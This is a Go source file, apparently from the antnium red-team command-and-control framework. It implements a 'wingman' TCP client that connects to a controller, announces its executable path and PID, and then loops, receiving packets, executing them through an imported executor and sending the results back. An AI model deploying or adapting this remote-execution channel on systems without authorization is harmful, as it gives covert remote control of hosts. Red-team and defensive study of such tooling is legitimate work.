package wingman

import (
	"bufio"
	"fmt"
	"io"
	"net"
	"os"
	"strconv"

	"github.com/dobin/antnium/pkg/executor"

	log "github.com/sirupsen/logrus"
)

type WingTcp struct {
	conn net.Conn
}

func MakeWingTcp() WingTcp {
	wing := WingTcp{}
	return wing
}

func (e *WingTcp) Start(destination string) error {
	if destination == "" {
		destination = "localhost:50000"
	}
	fmt.Println("Wingman: connect to: " + destination)

	conn, err := net.Dial("tcp", destination)
	if err != nil {
		return fmt.Errorf("Wingman: Could not connect: %s", err.Error())
	}
	log.Info("Wingman: Connected")

	// Send initial line
	ex, err := os.Executable()
	if err != nil {
		return fmt.Errorf("Wingman: Error: %s", err.Error())
	}
	pid := strconv.Itoa(os.Getpid())
	line := ex + ":" + pid + "\n"
	_, err = conn.Write([]byte(line))
	if err != nil {
		return fmt.Errorf("Wingman: Reading from pipe: %s", err.Error())
	}
	// no answer required
	e.conn = conn

	e.Loop()
	return nil
}

func (e *WingTcp) Shutdown() {
	if e.conn != nil {
		e.conn.Close()
	}
}

func (e *WingTcp) Loop() {
	executor := executor.MakeExecutor()

	for {
		// Read
		jsonStr, err := bufio.NewReader(e.conn).ReadString('\n')
		if err == io.EOF {
			break
		}
		if err != nil {
			log.Error("Wingman: Could not read: " + err.Error())
			break
		}
		packet, err := DecodePacket(jsonStr)
		if err != nil {
			log.Error("Wingman: Error: ", err.Error())
			continue
		}

		// Execute
		packet, err = executor.Execute(packet)
		if err != nil {
			log.WithFields(log.Fields{
				"packet": packet,
				"error":  err,
			}).Info("Wingman: Error executing packet")

			// TODO ERR
		}

		// Answer: Go to JSON
		packetEncoded, err := EncodePacket(packet)
		if err != nil {
			log.Error("Wingman: Error: ", err.Error())
		}
		n, err := e.conn.Write(packetEncoded)
		if err != nil {
			log.Error("Wingman: Error")

			// TODO ERR
		}
		e.conn.Write([]byte("\n"))
		fmt.Printf("Wingman: Written: %d bytes", n)
	}
}
